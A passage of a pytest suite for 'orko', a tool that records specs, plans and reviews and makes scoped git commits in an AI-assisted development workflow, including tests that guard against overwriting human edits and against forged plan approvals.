        monkeypatch.chdir(workspace / "code" / "scripts")
        capsys.readouterr()
        assert orko.main(["status", "demo-topic"]) == 0

    def test_status_outside_workspace_exits_2(self, tmp_path, capsys, monkeypatch):
        monkeypatch.chdir(tmp_path)
        assert orko.main(["status", "demo-topic"]) == 2


class TestFrontmatter:
    TEMPLATE = '---\nid: SPEC-NNN\ntitle: "[Capability]"\nstatus: draft\nimplements:\n  - SPEC-NNN\napproved_at: null\n---\n\n# body\n'

    def test_replaces_scalar_and_keeps_quotes(self):
        out = orko.set_frontmatter(self.TEMPLATE, {"id": "SPEC-004", "title": "Demo"})
        assert "id: SPEC-004\n" in out and 'title: "Demo"\n' in out

    def test_list_renders_as_block_sequence(self):
        out = orko.set_frontmatter(self.TEMPLATE, {"implements": ["SPEC-002"]})
        assert "implements:\n  - SPEC-002\napproved_at" in out
        assert "[SPEC" not in out.split("---")[1]

    def test_none_renders_null_and_body_untouched(self):
        out = orko.set_frontmatter(self.TEMPLATE, {"approved_at": None})
        assert "approved_at: null\n" in out and out.endswith("# body\n")

    def test_missing_key_is_appended(self):
        out = orko.set_frontmatter(self.TEMPLATE, {"reviewer": "orko (a, b)"})
        assert "reviewer: orko (a, b)\n---\n\n# body" in out

    def test_no_frontmatter_raises(self):
        with pytest.raises(ValueError):
            orko.set_frontmatter("# body only\n", {"id": "SPEC-001"})


class TestMintId:
    def test_first_spec_is_001(self, workspace):
        assert orko.next_id(workspace, "spec") == "SPEC-001"

    def test_scans_every_dossier(self, workspace):
        other = workspace / "docs/versions/0.2/specs"
        other.mkdir(parents=True)
        (other / "SPEC-003-old.md").write_text("x")
        assert orko.next_id(workspace, "spec") == "SPEC-004"

    def test_decision_and_adr_scan_their_own_dirs(self, workspace):
        (workspace / "docs/decisions/DEC-007-x.md").write_text("x")
        (workspace / "code/docs/adr/ADR-002-x.md").write_text("x")
        assert orko.next_id(workspace, "decision") == "DEC-008"
        assert orko.next_id(workspace, "adr") == "ADR-003"


def rec(workspace, capsys, *args):
    capsys.readouterr()
    code = orko.main(["record", *args, "--workspace", str(workspace)])
    out = capsys.readouterr()
    return code, (json.loads(out.out) if out.out.strip().startswith("{") else out.err)


class TestRecordSpecPlan:
    def test_spec_mints_001_with_frontmatter(self, workspace, capsys):
        init_run(workspace, capsys)
        code, out = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo capability")
        assert code == 0 and out["id"] == "SPEC-001"
        path = Path(out["path"])
        assert path == workspace / "docs/versions/0.1/specs/SPEC-001-demo-topic.md"
        text = path.read_text()
        assert "id: SPEC-001\n" in text and 'title: "Demo capability"' in text
        assert "status: draft\n" in text and 'product_version: "0.1"' in text
        assert 'owner: "oiler"' in text and "approved_at: null" in text
        assert "# SPEC-001 — Demo capability" in text

    def test_spec_row_replaces_readme_placeholder(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo capability")
        readme = (workspace / "docs/versions/0.1/README.md").read_text()
        assert "| [SPEC-001] |" not in readme
        assert "| SPEC-001 | Specification | Demo capability | draft | oiler |" in readme

    def test_plan_writes_block_sequence(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo capability")
        code, out = rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Demo plan", "--implements", "SPEC-001")
        text = Path(out["path"]).read_text()
        assert "implements:\n  - SPEC-001\n" in text
        assert "[SPEC" not in text.split("---")[1]

    def test_second_mint_of_same_role_returns_existing(self, workspace, capsys):
        init_run(workspace, capsys)
        _, first = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        code, second = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert code == 0 and second["path"] == first["path"] and second["resumed"] is True
        assert not (workspace / "docs/versions/0.1/specs/SPEC-002-demo-topic.md").exists()

    def test_release_index_survives_three_mints(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan", "--implements", "SPEC-001")
        readme = (workspace / "docs/versions/0.1/README.md").read_text()
        assert "| [0.1.0] | planned |" in readme
        assert "| PLAN-001 | Delivery plan | Plan | draft | oiler |" in readme

    def test_record_line_in_ledger(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert orko.record_for(Path(payload["ledger"]), "spec", "spec")["id"] == "SPEC-001"


class TestRecordReview:
    def _findings_dir(self, workspace):
        src = Path(orko.__file__).parent / "fixtures/findings"
        dst = workspace / ".orko/demo-topic/findings/2"
        shutil.copytree(src, dst)
        return dst

    def test_parse_findings(self):
        text = (Path(orko.__file__).parent / "fixtures/findings/requirements.md").read_text()
        seat, findings = orko.parse_findings(text)
        assert seat["seat"] == "requirements" and len(findings) == 2
        assert findings[0]["severity"] == "high" and findings[1]["title"] == "Non-goals contradict scope"

    def test_parse_verdicts(self):
        text = (Path(orko.__file__).parent / "fixtures/findings/requirements.verdict.md").read_text()
        verdicts = orko.parse_verdicts(text)
        assert verdicts["F1"].startswith("confirmed: ")
        assert verdicts["F2"].startswith("overstated: ")

    def test_review_renders_f_blocks_in_seat_order(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        d = self._findings_dir(workspace)
        code, out = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
                        "--reviews", "SPEC-001", "--revision", "abc1234", "--from-findings", str(d),
                        "--title", "Spec review")
        assert code == 0
        text = Path(out["path"]).read_text()
        assert out["path"].endswith("REVIEW-001-demo-topic-spec.md")
        assert "reviews:\n  - SPEC-001\n" in text
        assert 'reviewer: "orko (requirements, security)"' in text
        assert "approved_by: null" in text
        assert text.count("### F") == 3
        f1 = text.split("### F1")[1].split("### F2")[0]
        assert "- Severity: `high`" in f1 and "- Disposition: `open`" in f1
        assert "| Verified: confirmed: the quoted line" in f1
        assert "### F3 — Upload path is unbounded" in text

    def test_review_row_in_index(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        d = self._findings_dir(workspace)
        rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec", "--reviews", "SPEC-001",
            "--revision", "abc1234", "--from-findings", str(d), "--title", "Spec review")
        assert "| REVIEW-001 | Review | Spec review | draft | oiler |" in (workspace / "docs/versions/0.1/README.md").read_text()

    def test_seat_flags_set_order(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        d = self._findings_dir(workspace)
        code, out = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
                        "--reviews", "SPEC-001", "--revision", "abc1234", "--from-findings", str(d),
                        "--seat", "security", "--seat", "requirements", "--title", "Spec review")
        assert code == 0
        text = Path(out["path"]).read_text()
        assert "### F1 — Upload path is unbounded" in text
        assert 'reviewer: "orko (security, requirements)"' in text

    def test_seat_to_finding_ranges_are_printed(self, workspace, capsys):
        # Getting --seat order wrong silently renumbers every finding, so the
        # mint reports which F blocks each seat became.
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        d = self._findings_dir(workspace)
        code, out = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
                        "--reviews", "SPEC-001", "--revision", "abc1234", "--from-findings", str(d),
                        "--title", "Spec review")
        assert code == 0
        assert out["seats"] == {"requirements": ["F1", "F2"], "security": ["F3"]}

    def test_missing_findings_file_exits_2(self, workspace, capsys):
        init_run(workspace, capsys)
        d = self._findings_dir(workspace)
        code, err = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec",
                        "--reviews", "SPEC-001", "--revision", "abc1234", "--from-findings", str(d),
                        "--seat", "nobody", "--title", "Spec review")
        assert code == 2 and "no findings file" in err


class TestRecordOthers:
    def _spec_and_review(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        d = workspace / ".orko/demo-topic/findings/2"
        shutil.copytree(Path(orko.__file__).parent / "fixtures/findings", d)
        _, out = rec(workspace, capsys, "review", "--slug", "demo-topic", "--role", "spec", "--reviews", "SPEC-001",
                     "--revision", "abc1234", "--from-findings", str(d), "--title", "Spec review")
        return Path(out["path"])

    def test_disposition_sets_one_finding(self, workspace, capsys):
        review = self._spec_and_review(workspace, capsys)
        code, _ = rec(workspace, capsys, "disposition", "--slug", "demo-topic", "--review", "REVIEW-001",
                      "--finding", "F2", "--disposition", "rejected")
        assert code == 0
        text = review.read_text()
        assert text.count("- Disposition: `open`") == 2 and "- Disposition: `rejected`" in text.split("### F2")[1].split("### F3")[0]

    def test_disposition_noted_is_accepted(self, workspace, capsys):
        # A `note` finding whose Recommendation is "no change" is neither
        # accepted nor rejected.
        review = self._spec_and_review(workspace, capsys)
        code, _ = rec(workspace, capsys, "disposition", "--slug", "demo-topic",
                      "--review", "REVIEW-001", "--finding", "F2",
                      "--disposition", "noted")
        assert code == 0
        text = review.read_text()
        assert "- Disposition: `noted`" in text.split("### F2")[1].split("### F3")[0]

    def test_disposition_unknown_finding_exits_2(self, workspace, capsys):
        self._spec_and_review(workspace, capsys)
        code, _ = rec(workspace, capsys, "disposition", "--slug", "demo-topic", "--review", "REVIEW-001",
                      "--finding", "F9", "--disposition", "accepted")
        assert code == 2

    def test_status_in_review_and_refuses_accepted(self, workspace, capsys):
        self._spec_and_review(workspace, capsys)
        assert rec(workspace, capsys, "status", "--slug", "demo-topic", "--id", "SPEC-001", "--status", "in_review")[0] == 0
        assert "status: in_review" in (workspace / "docs/versions/0.1/specs/SPEC-001-demo-topic.md").read_text()
        with pytest.raises(SystemExit):
            rec(workspace, capsys, "status", "--slug", "demo-topic", "--id", "SPEC-001", "--status", "accepted")

    def test_amendment_appends_dated_line(self, workspace, capsys):
        self._spec_and_review(workspace, capsys)
        rec(workspace, capsys, "amendment", "--slug", "demo-topic", "--id", "SPEC-001", "--text", "R2 now returns 404")
        text = (workspace / "docs/versions/0.1/specs/SPEC-001-demo-topic.md").read_text()
        assert re.search(r"## Amendments\n\n<!--.*?-->\n\n- \d{4}-\d{2}-\d{2}: R2 now returns 404\n", text, re.DOTALL)

    def test_decision_and_adr(self, workspace, capsys):
        init_run(workspace, capsys)
        _, dec = rec(workspace, capsys, "decision", "--slug", "demo-topic", "--title", "Drop Linear")
        assert dec["path"].endswith("docs/decisions/DEC-001-demo-topic.md")
        assert "status: proposed" in Path(dec["path"]).read_text()
        assert "| DEC-001 | Drop Linear | proposed |" in (workspace / "docs/decisions/README.md").read_text()
        _, adr = rec(workspace, capsys, "adr", "--slug", "demo-topic", "--title", "Use sqlite")
        assert adr["path"].endswith("code/docs/adr/ADR-001-demo-topic.md")
        assert "# ADR-001 — Use sqlite" in Path(adr["path"]).read_text()
        assert not list((workspace / "docs").rglob("ADR-*"))

    def test_delivery_decision_row_and_risk_bullet(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan", "--implements", "SPEC-001")
        assert rec(workspace, capsys, "delivery-decision", "--slug", "demo-topic", "--decision", "Use sqlite", "--rationale", "no server")[0] == 0
        plan = (workspace / "docs/versions/0.1/plans/PLAN-001-demo-topic.md").read_text()
        assert "| Use sqlite | no server |  |" in plan.split("## Delivery decisions")[1].split("## Delivery sequence")[0]
        assert rec(workspace, capsys, "risk", "--slug", "demo-topic", "--text", "F3 deferred: upload bound")[0] == 0
        readme = (workspace / "docs/versions/0.1/README.md").read_text()
        assert "- F3 deferred: upload bound" in readme.split("## Risks, blockers, and open decisions")[1]

    def test_risk_on_a_readme_without_the_heading_exits_2(self, workspace, capsys):
        init_run(workspace, capsys)
        readme = workspace / "docs/versions/0.1/README.md"
        readme.write_text(readme.read_text().split("## Risks, blockers")[0])
        code, err = rec(workspace, capsys, "risk", "--slug", "demo-topic",
                        "--text", "upload bound")
        assert code == 2
        assert "has no '## Risks, blockers, and open decisions' section" in err

    def test_delivery_decision_on_a_plan_without_the_section_exits_2(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        _, plan = rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan",
                      "--implements", "SPEC-001")
        path = Path(plan["path"])
        text = path.read_text()
        head, _, rest = text.partition("## Delivery decisions")
        path.write_text(head + rest.partition("\n## ")[1] + rest.partition("\n## ")[2])
        code, err = rec(workspace, capsys, "delivery-decision", "--slug", "demo-topic",
                        "--decision", "Use sqlite", "--rationale", "no server")
        assert code == 2
        assert "has no '## Delivery decisions' section" in err

    def test_index_without_a_table_exits_2_not_stopiteration(self, workspace, capsys):
        init_run(workspace, capsys)
        readme = workspace / "docs/versions/0.1/README.md"
        text = readme.read_text()
        head, sep, rest = text.partition("## Artifact index")
        readme.write_text(head + sep + "\n\nNo table here yet.\n")
        code, err = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert code == 2
        assert "has no table under ## Artifact index" in err

    def test_research_stamped(self, workspace, capsys):
        init_run(workspace, capsys, "analysis", "Why is it slow")
        _, out = rec(workspace, capsys, "research", "--slug", "why-is-it-slow", "--title", "Why is it slow")
        text = Path(out["path"]).read_text()
        assert "AI-generated" in text and out["path"].endswith("-why-is-it-slow.md")

    def test_disposition_twice_refuses_and_leaves_neighbors(self, workspace, capsys):
        review = self._spec_and_review(workspace, capsys)
        assert rec(workspace, capsys, "disposition", "--slug", "demo-topic", "--review", "REVIEW-001",
                   "--finding", "F1", "--disposition", "rejected")[0] == 0
        assert rec(workspace, capsys, "disposition", "--slug", "demo-topic", "--review", "REVIEW-001",
                   "--finding", "F1", "--disposition", "accepted")[0] == 2
        text = review.read_text()
        assert "- Disposition: `accepted`" not in text
        assert "- Disposition: `open`" in text.split("### F2")[1].split("### F3")[0]

    def test_amendment_stays_inside_its_section(self, workspace, capsys):
        self._spec_and_review(workspace, capsys)
        spec = workspace / "docs/versions/0.1/specs/SPEC-001-demo-topic.md"
        spec.write_text(spec.read_text().rstrip("\n") + "\n\n## Trailing notes\n\n- keep me last\n")
        rec(workspace, capsys, "amendment", "--slug", "demo-topic", "--id", "SPEC-001", "--text", "R2 now returns 404")
        text = spec.read_text()
        amendments = text.split("## Amendments")[1].split("## Trailing notes")[0]
        assert re.search(r"\n\n- \d{4}-\d{2}-\d{2}: R2 now returns 404\n", amendments)
        assert text.rstrip().endswith("- keep me last")


def git_out(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, check=True).stdout


class TestCommit:
    def test_docs_commit_stages_records_and_carries_ids_and_trailers(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "draft spec",
                          "--workspace", str(workspace)]) == 0
        body = git_out(workspace / "docs", "log", "-1", "--format=%B")
        assert body.startswith("draft spec\n\nRefs: SPEC-001\n")
        assert "Co-Authored-By: T <t@example.invalid>" in body and "Claude-Session:" in body
        assert git_out(workspace / "docs", "status", "--porcelain") == ""  # the version README index row is staged too
        assert orko.hashes(Path(payload["ledger"]))["docs/versions/0.1/specs/SPEC-001-demo-topic.md"]
        assert "versions/0.1/README.md" in git_out(workspace / "docs", "show", "--name-only", "HEAD")

    def test_commit_leaves_pre_staged_unrelated_files_out(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        (workspace / "docs/UNRELATED.md").write_text("mine\n")
        subprocess.run(["git", "-C", str(workspace / "docs"), "add", "UNRELATED.md"], check=True)
        assert orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "draft spec",
                          "--workspace", str(workspace)]) == 0
        assert "UNRELATED.md" not in git_out(workspace / "docs", "show", "--name-only", "HEAD")
        assert "A  UNRELATED.md" in git_out(workspace / "docs", "status", "--porcelain")

    def test_code_commit_never_stages_docs(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        (workspace / "code/src.py").write_text("x = 1\n")
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--message", "add src",
                          "--path", "src.py", "--workspace", str(workspace)]) == 0
        assert "src.py" in git_out(workspace / "code", "show", "--name-only", "HEAD")
        assert git_out(workspace / "docs", "status", "--porcelain") != ""

    def test_a_dropped_path_is_named_on_stderr(self, workspace, capsys):
        init_run(workspace, capsys)
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        capsys.readouterr()
        assert orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m",
                          "--path", "adr/ADR-002-typo.md",
                          "--workspace", str(workspace)]) == 0
        err = capsys.readouterr().err
        assert "orko: skipping adr/ADR-002-typo.md (missing, absolute, or outside docs/)" in err

    def test_only_a_dropped_path_leaves_nothing_to_stage(self, workspace, capsys):
        init_run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--message", "m",
                          "--path", "nope.py", "--workspace", str(workspace)]) == 2
        err = capsys.readouterr().err
        assert "orko: skipping nope.py" in err
        # The refusal names the escape hatch: exit 2 is a stop everywhere else
        # in the skill, and step 6's own commit needs `--path` for code the run
        # wrote outside the record.
        assert ("orko: nothing to stage in code; pass --path <repo-relative file> "
                "for files the run wrote outside the record") in err

    def test_nothing_to_stage_exits_2(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--message", "x",
                          "--workspace", str(workspace)]) == 2


class TestCommitTask:
    """`commit code --task N` — the commit Codex cannot make for itself."""

    def _run(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan",
            "--implements", "SPEC-001")
        shutil.copy(Path(orko.__file__).parent / "fixtures/tasks.md", payload["tasks"])
        return payload

    def _write(self, workspace, path, content="x = 1\n"):
        f = workspace / "code" / path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)

    def test_the_task_files_and_the_readme_are_staged_and_the_leftovers_are_not(
        self, workspace, capsys
    ):
        self._run(workspace, capsys)
        for path in orko.parse_tasks((workspace / ".orko/demo-topic/tasks.md").read_text())[0]["files"]:
            self._write(workspace, path)
        readme = workspace / "code/docs/testing/README.md"
        readme.write_text(readme.read_text() + "\n| SPEC-001 R1 | test_moves |\n")
        self._write(workspace, ".venv/x", "v\n")
        self._write(workspace, "uv.lock", "lock\n")
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        payload = json.loads(capsys.readouterr().out)
        assert sorted(payload["staged"]) == ["docs/testing/README.md",
                                             "orko/scripts/orko.py",
                                             "orko/scripts/test_orko.py"]
        assert payload["task"] == 1
        body = git_out(workspace / "code", "log", "-1", "--format=%B")
        assert body.startswith("Task 1: Move the script into orko and rebase its paths\n\n"
                               "Refs: PLAN-001, SPEC-001\n")
        assert "Co-Authored-By: T <t@example.invalid>" in body and "Claude-Session:" in body
        # The acceptance command's droppings are the script's to leave alone.
        status = git_out(workspace / "code", "status", "--porcelain", "--untracked-files=all")
        assert "?? uv.lock" in status and "?? .venv/x" in status

    def test_an_explicit_message_wins_over_the_task_subject(self, workspace, capsys):
        self._run(workspace, capsys)
        self._write(workspace, "orko/scripts/orko.py")
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--message", "hand-written subject",
                          "--workspace", str(workspace)]) == 0
        assert git_out(workspace / "code", "log", "-1", "--format=%s") == "hand-written subject\n"

    def test_task_on_docs_is_a_usage_error(self, workspace, capsys):
        self._run(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["commit", "docs", "--slug", "demo-topic", "--task", "1",
                          "--message", "m", "--workspace", str(workspace)]) == 2
        assert "orko: --task" in capsys.readouterr().err

    def test_a_task_whose_files_are_all_missing_exits_2(self, workspace, capsys):
        self._run(workspace, capsys)
        # Without the testing README the task has nothing left that exists.
        subprocess.run(["git", "-C", str(workspace / "code"), "rm", "-q", "-r",
                        "docs/testing"], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "drop"], check=True)
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 2
        assert "orko: nothing to stage in code" in capsys.readouterr().err

    def test_a_directory_in_files_is_skipped_not_swept_in(self, workspace, capsys):
        # `git add -A -- <dir>` would stage every leftover under it, and the
        # hash line would then raise on the directory itself.
        self._run(workspace, capsys)
        tasks = workspace / ".orko/demo-topic/tasks.md"
        tasks.write_text(tasks.read_text().replace(
            "- Modify: `orko/scripts/orko.py` functions", "- Modify: `orko/scripts` functions", 1))
        self._write(workspace, "orko/scripts/test_orko.py")
        self._write(workspace, "orko/scripts/__pycache__/orko.pyc", "compiled\n")
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        captured = capsys.readouterr()
        assert ("orko: skipping orko/scripts (directory; list files in **Files:**)"
                in captured.err)
        assert sorted(json.loads(captured.out)["staged"]) == ["docs/testing/README.md",
                                                             "orko/scripts/test_orko.py"]
        assert "__pycache__" not in git_out(workspace / "code", "show", "--name-only", "HEAD")

    def test_a_second_commit_of_the_same_task_reports_the_first(self, workspace, capsys):
        # A compaction between loop steps 5 and 6 leaves the conductor no way to
        # tell the commit landed, and exit 2 would stop the run.
        self._run(workspace, capsys)
        orko.main(["ledger", "5.1", "dispatched", "--commit",
                   git_out(workspace / "code", "rev-parse", "HEAD").strip(),
                   "--slug", "demo-topic", "--workspace", str(workspace)])
        self._write(workspace, "orko/scripts/orko.py")
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        head = git_out(workspace / "code", "rev-parse", "HEAD").strip()
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        payload = json.loads(capsys.readouterr().out)
        assert payload["already"] is True and payload["commit"] == head
        assert git_out(workspace / "code", "rev-parse", "HEAD").strip() == head

    def test_a_landed_deletion_only_task_reports_the_first_commit(self, workspace, capsys):
        # The one shape where nothing is stageable on the re-run: the task's
        # whole delivery was a deletion, so after it lands every path it names
        # is both absent and untracked.
        self._run(workspace, capsys)
        tasks = workspace / ".orko/demo-topic/tasks.md"
        tasks.write_text(tasks.read_text().replace(
            "- Create: `orko/scripts/orko.py` (from", "- Delete: `CHANGELOG.md` (was", 1))
        for path in ("docs/testing/README.md", "orko/scripts/test_orko.py"):
            subprocess.run(["git", "-C", str(workspace / "code"), "rm", "-q", "--ignore-unmatch",
                            path], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "drop"], check=True)
        orko.main(["ledger", "5.1", "dispatched", "--commit",
                   git_out(workspace / "code", "rev-parse", "HEAD").strip(),
                   "--slug", "demo-topic", "--workspace", str(workspace)])
        (workspace / "code/CHANGELOG.md").unlink()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        head = git_out(workspace / "code", "rev-parse", "HEAD").strip()
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        payload = json.loads(capsys.readouterr().out)
        assert payload["already"] is True and payload["staged"] == []
        assert git_out(workspace / "code", "rev-parse", "HEAD").strip() == head

    def test_a_deleted_listed_file_is_staged_as_a_deletion(self, workspace, capsys):
        self._run(workspace, capsys)
        self._write(workspace, "orko/scripts/orko.py")
        subprocess.run(["git", "-C", str(workspace / "code"), "add", "-A"], check=True)
        subprocess.run(["git", "-C", str(workspace / "code"), "commit", "-qm", "seed"], check=True)
        (workspace / "code/orko/scripts/orko.py").unlink()
        capsys.readouterr()
        assert orko.main(["commit", "code", "--slug", "demo-topic", "--task", "1",
                          "--workspace", str(workspace)]) == 0
        assert "orko/scripts/orko.py" in git_out(
            workspace / "code", "show", "--name-only", "--diff-filter=D", "HEAD")


class TestOverwriteGuard:
    def _committed_spec(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        _, out = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        orko.main(["commit", "docs", "--slug", "demo-topic", "--message", "m", "--workspace", str(workspace)])
        return Path(payload["ledger"]), Path(out["path"])

    def test_no_recorded_hash_passes(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        _, out = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        assert orko.overwrite_guard(Path(payload["ledger"]), workspace, Path(out["path"])) is None

    def test_missing_file_passes(self, workspace, capsys):
        ledger, path = self._committed_spec(workspace, capsys)
        path.unlink()
        assert orko.overwrite_guard(ledger, workspace, path) is None

    def test_unchanged_file_passes(self, workspace, capsys):
        ledger, path = self._committed_spec(workspace, capsys)
        assert orko.overwrite_guard(ledger, workspace, path) is None

    def test_changed_hash_is_a_finding(self, workspace, capsys):
        ledger, path = self._committed_spec(workspace, capsys)
        path.write_text(path.read_text() + "\nhuman edit\n")
        assert orko.overwrite_guard(ledger, workspace, path).startswith("edited-since-commit")

    def test_record_status_refuses_after_human_edit(self, workspace, capsys):
        ledger, path = self._committed_spec(workspace, capsys)
        path.write_text(path.read_text() + "\nhuman edit\n")
        assert rec(workspace, capsys, "status", "--slug", "demo-topic", "--id", "SPEC-001", "--status", "in_review")[0] == 2


def apply_body(path: Path, body_fixture: str) -> None:
    text = path.read_text()
    head = text.split("\n## ", 1)[0]          # frontmatter + title
    body = (Path(orko.__file__).parent / "fixtures" / body_fixture).read_text()
    path.write_text(head + "\n" + body)


class TestCheckSpec:
    def _spec(self, workspace, capsys):
        init_run(workspace, capsys)
        _, out = rec(workspace, capsys, "spec", "--slug", "demo-topic", "--title", "Demo")
        apply_body(Path(out["path"]), "spec-body.md")
        return out

    def test_fixture_spec_passes_without_plan(self, workspace, capsys):
        self._spec(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["check", "spec", "SPEC-001", "--slug", "demo-topic", "--workspace", str(workspace)]) == 0
        assert "READY SPEC-001" in capsys.readouterr().out

    def test_plan_mapping_is_asserted_positively(self, workspace, capsys):
        self._spec(workspace, capsys)
        _, plan = rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan", "--implements", "SPEC-001")
        apply_body(Path(plan["path"]), "plan-body.md")
        capsys.readouterr()
        assert orko.main(["check", "spec", "SPEC-001", "--slug", "demo-topic", "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert "ok   plan maps R1" in out and "no PLAN" not in out

    def test_require_plan_fails_without_plan(self, workspace, capsys):
        self._spec(workspace, capsys)
        capsys.readouterr()
        assert orko.main(["check", "spec", "SPEC-001", "--require-plan", "--slug", "demo-topic", "--workspace", str(workspace)]) == 1
        assert "plan-missing" in capsys.readouterr().out

    def _mapped_plan(self, workspace, capsys):
        self._spec(workspace, capsys)
        _, plan = rec(workspace, capsys, "plan", "--slug", "demo-topic", "--title", "Plan",
                      "--implements", "SPEC-001")
        path = Path(plan["path"])
        apply_body(path, "plan-body.md")
        return path

    def _sign(self, path, third):
        head, sep, rest = path.read_text().partition("## Delivery decisions")
        row = f"| Positional arguments | Keeps the call sites unchanged | {third} |\n"
        path.write_text(head + sep + rest.replace(
            "| --- | --- | --- |\n", "| --- | --- | --- |\n" + row, 1))

    def _require_plan(self, workspace, capsys):
        capsys.readouterr()
        code = orko.main(["check", "spec", "SPEC-001", "--require-plan", "--slug",
                          "demo-topic", "--workspace", str(workspace)])
        return code, capsys.readouterr().out

    def test_require_plan_rejects_a_signed_draft_plan(self, workspace, capsys):
        # Only a human signs. A seat that wrote its own name into Approved by
        # forges an approval, and the gate is where that has to stop.
        path = self._mapped_plan(workspace, capsys)
        self._sign(path, "oiler")
        code, out = self._require_plan(workspace, capsys)
        assert code == 1
        assert "plan-approval-signed:" in out and "on a draft plan" in out

    def test_require_plan_passes_an_unsigned_draft_plan(self, workspace, capsys):
        path = self._mapped_plan(workspace, capsys)
        self._sign(path, " ")
        code, out = self._require_plan(workspace, capsys)
        assert code == 0, out
        assert "plan-approval-signed" not in out

    def test_signed_row_on_in_review_plan_passes(self, workspace, capsys):
        # The gate sets in_review, then a human signs. Firing here would stop
        # step 5 on the very signature the gate asked for.
        path = self._mapped_plan(workspace, capsys)
        self._sign(path, "oiler")
        rec(workspace, capsys, "status", "--slug", "demo-topic", "--id", "PLAN-001",
            "--status", "in_review")
        code, out = self._require_plan(workspace, capsys)
        assert code == 0, out
        assert "plan-approval-signed" not in out

    def test_placeholder_approver_row_is_not_a_signature(self, workspace, capsys):
        # The scaffold template's own row. spec-check already fails placeholders.
        path = self._mapped_plan(workspace, capsys)
        self._sign(path, "[Approver]")
        assert orko.signed_delivery_rows(path) == []
        # spec-check owns the placeholder verdict, so the exit is still 1 --
        # but on its own finding, never on a forged approval.
        code, out = self._require_plan(workspace, capsys)
        assert code == 1
        assert "plan-approval-signed" not in out
        assert "plan placeholders remain" in out

